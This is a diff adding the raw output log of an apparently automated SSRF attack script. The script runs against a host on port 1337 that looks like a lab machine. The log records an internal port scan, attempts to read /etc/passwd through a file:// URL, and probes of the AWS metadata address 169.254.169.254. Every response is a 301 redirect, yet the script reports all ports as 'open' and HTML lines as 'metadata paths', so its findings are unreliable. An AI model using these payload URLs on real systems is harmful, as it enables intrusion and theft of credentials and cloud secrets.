@@ -1,0 +1,196 @@
+
+========== Step 1: SSRF Parameter Detection ==========
+  [+] Testing 'url' → HTTP 301
+  [+] Testing 'path' → HTTP 301
+  [+] Testing 'next' → HTTP 301
+  [+] Testing 'data' → HTTP 301
+  [+] Testing 'link' → HTTP 301
+  [+] Testing 'target' → HTTP 301
+  [+] Testing 'redirect' → HTTP 301
+  [+] Testing 'dest' → HTTP 301
+
+========== Step 2: Internal Port Scan via SSRF ==========
+  [+] 127.0.0.1:1 seems open (HTTP 301)
+  [+] 127.0.0.1:2 seems open (HTTP 301)
+  [+] 127.0.0.1:3 seems open (HTTP 301)
+  [+] 127.0.0.1:4 seems open (HTTP 301)
+  [+] 127.0.0.1:5 seems open (HTTP 301)
+  [+] 127.0.0.1:6 seems open (HTTP 301)
+  [+] 127.0.0.1:7 seems open (HTTP 301)
+  [+] 127.0.0.1:8 seems open (HTTP 301)
+  [+] 127.0.0.1:9 seems open (HTTP 301)
+  [+] 127.0.0.1:10 seems open (HTTP 301)
+  [+] 127.0.0.1:11 seems open (HTTP 301)
+  [+] 127.0.0.1:12 seems open (HTTP 301)
+  [+] 127.0.0.1:13 seems open (HTTP 301)
+  [+] 127.0.0.1:14 seems open (HTTP 301)
+  [+] 127.0.0.1:15 seems open (HTTP 301)
+  [+] 127.0.0.1:16 seems open (HTTP 301)
+  [+] 127.0.0.1:17 seems open (HTTP 301)
+  [+] 127.0.0.1:18 seems open (HTTP 301)
+  [+] 127.0.0.1:19 seems open (HTTP 301)
+  [+] 127.0.0.1:20 seems open (HTTP 301)
+  [+] 127.0.0.1:21 seems open (HTTP 301)
+  [+] 127.0.0.1:22 seems open (HTTP 301)
+  [+] 127.0.0.1:23 seems open (HTTP 301)
+  [+] 127.0.0.1:24 seems open (HTTP 301)
+  [+] 127.0.0.1:25 seems open (HTTP 301)
+  [+] 127.0.0.1:26 seems open (HTTP 301)
+  [+] 127.0.0.1:27 seems open (HTTP 301)
+  [+] 127.0.0.1:28 seems open (HTTP 301)
+  [+] 127.0.0.1:29 seems open (HTTP 301)
+  [+] 127.0.0.1:30 seems open (HTTP 301)
+  [+] 127.0.0.1:31 seems open (HTTP 301)
+  [+] 127.0.0.1:32 seems open (HTTP 301)
+  [+] 127.0.0.1:33 seems open (HTTP 301)
+  [+] 127.0.0.1:34 seems open (HTTP 301)
+  [+] 127.0.0.1:35 seems open (HTTP 301)
+  [+] 127.0.0.1:36 seems open (HTTP 301)
+  [+] 127.0.0.1:37 seems open (HTTP 301)
+  [+] 127.0.0.1:38 seems open (HTTP 301)
+  [+] 127.0.0.1:39 seems open (HTTP 301)
+  [+] 127.0.0.1:40 seems open (HTTP 301)
+  [+] 127.0.0.1:41 seems open (HTTP 301)
+  [+] 127.0.0.1:42 seems open (HTTP 301)
+  [+] 127.0.0.1:43 seems open (HTTP 301)
+  [+] 127.0.0.1:44 seems open (HTTP 301)
+  [+] 127.0.0.1:45 seems open (HTTP 301)
+  [+] 127.0.0.1:46 seems open (HTTP 301)
+  [+] 127.0.0.1:47 seems open (HTTP 301)
+  [+] 127.0.0.1:48 seems open (HTTP 301)
+  [+] 127.0.0.1:49 seems open (HTTP 301)
+  [+] 127.0.0.1:50 seems open (HTTP 301)
+  [+] 127.0.0.1:51 seems open (HTTP 301)
+  [+] 127.0.0.1:52 seems open (HTTP 301)
+  [+] 127.0.0.1:53 seems open (HTTP 301)
+  [+] 127.0.0.1:54 seems open (HTTP 301)
+  [+] 127.0.0.1:55 seems open (HTTP 301)
+  [+] 127.0.0.1:56 seems open (HTTP 301)
+  [+] 127.0.0.1:57 seems open (HTTP 301)
+  [+] 127.0.0.1:58 seems open (HTTP 301)
+  [+] 127.0.0.1:59 seems open (HTTP 301)
+  [+] 127.0.0.1:60 seems open (HTTP 301)
+  [+] 127.0.0.1:61 seems open (HTTP 301)
+  [+] 127.0.0.1:62 seems open (HTTP 301)
+  [+] 127.0.0.1:63 seems open (HTTP 301)
+  [+] 127.0.0.1:64 seems open (HTTP 301)
+  [+] 127.0.0.1:65 seems open (HTTP 301)
+  [+] 127.0.0.1:66 seems open (HTTP 301)
+  [+] 127.0.0.1:67 seems open (HTTP 301)
+  [+] 127.0.0.1:68 seems open (HTTP 301)
+  [+] 127.0.0.1:69 seems open (HTTP 301)
+  [+] 127.0.0.1:70 seems open (HTTP 301)
+  [+] 127.0.0.1:71 seems open (HTTP 301)
+  [+] 127.0.0.1:72 seems open (HTTP 301)
+  [+] 127.0.0.1:73 seems open (HTTP 301)
+  [+] 127.0.0.1:74 seems open (HTTP 301)
+  [+] 127.0.0.1:75 seems open (HTTP 301)
+  [+] 127.0.0.1:76 seems open (HTTP 301)
+  [+] 127.0.0.1:77 seems open (HTTP 301)
+  [+] 127.0.0.1:78 seems open (HTTP 301)
+  [+] 127.0.0.1:79 seems open (HTTP 301)
+  [+] 127.0.0.1:80 seems open (HTTP 301)
+  [+] 127.0.0.1:81 seems open (HTTP 301)
+  [+] 127.0.0.1:82 seems open (HTTP 301)
+  [+] 127.0.0.1:83 seems open (HTTP 301)
+  [+] 127.0.0.1:84 seems open (HTTP 301)
+  [+] 127.0.0.1:85 seems open (HTTP 301)
+  [+] 127.0.0.1:86 seems open (HTTP 301)
+  [+] 127.0.0.1:87 seems open (HTTP 301)
+  [+] 127.0.0.1:88 seems open (HTTP 301)
+  [+] 127.0.0.1:89 seems open (HTTP 301)
+  [+] 127.0.0.1:90 seems open (HTTP 301)
+  [+] 127.0.0.1:91 seems open (HTTP 301)
+  [+] 127.0.0.1:92 seems open (HTTP 301)
+  [+] 127.0.0.1:93 seems open (HTTP 301)
+  [+] 127.0.0.1:94 seems open (HTTP 301)
+  [+] 127.0.0.1:95 seems open (HTTP 301)
+  [+] 127.0.0.1:96 seems open (HTTP 301)
+  [+] 127.0.0.1:97 seems open (HTTP 301)
+  [+] 127.0.0.1:98 seems open (HTTP 301)
+  [+] 127.0.0.1:99 seems open (HTTP 301)
+  [+] 127.0.0.1:100 seems open (HTTP 301)
+
+========== Step 3: Attempting to Read Local Files (/etc/passwd) ==========
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=file:///etc/passwd">here</a>.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+</body></html>
+
+========== Step 4: Cloud Metadata (AWS-style) ==========
+  [+] Found metadata path: <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+      
+  [+] Found metadata path: <html><head>
+      <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=http://169.254.169.254/latest/meta-data/&lt;html&gt;&lt;head&gt;">here</a>.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+</body></html>
+  [+] Found metadata path: <title>301 Moved Permanently</title>
+      
+  [+] Found metadata path: </head><body>
+      <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=http://169.254.169.254/latest/meta-data/&lt;/head&gt;&lt;body&gt;">here</a>.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+</body></html>
+  [+] Found metadata path: <h1>Moved Permanently</h1>
+      
+  [+] Found metadata path: <p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=http://169.254.169.254/latest/meta-data/">here</a>.</p>
+      
+  [+] Found metadata path: <hr>
+      <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=http://169.254.169.254/latest/meta-data/&lt;hr&gt;">here</a>.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+</body></html>
+  [+] Found metadata path: <address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+      
+  [+] Found metadata path: </body></html>
+      <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=http://169.254.169.254/latest/meta-data/&lt;/body&gt;&lt;/html&gt;">here</a>.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+</body></html>
+
+========== Step 5: Scan Internal Web Apps ==========
+  [+] Web app on 127.0.0.1:80 → HTTP 301
+  [+] Web app on 127.0.0.1:443 → HTTP 301
+  [+] Web app on 127.0.0.1:8000 → HTTP 301
+  [+] Web app on 127.0.0.1:8080 → HTTP 301
+  [+] Web app on 127.0.0.1:3000 → HTTP 301
+  [+] Web app on 127.0.0.1:5000 → HTTP 301
+  [+] Web app on 127.0.0.1:8888 → HTTP 301
+
+========== Step 6: Proxy Request to Internal Endpoint ==========
+[*] Trying to access http://127.0.0.1:8080/api/status via SSRF...
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>301 Moved Permanently</title>
+</head><body>
+<h1>Moved Permanently</h1>
+<p>The document has moved <a href="http://10.10.120.144:1337/admin/?url=http://127.0.0.1:8080/api/status">here</a>.</p>
+<hr>
+<address>Apache/2.4.41 (Ubuntu) Server at 10.10.120.144 Port 1337</address>
+</body></html>
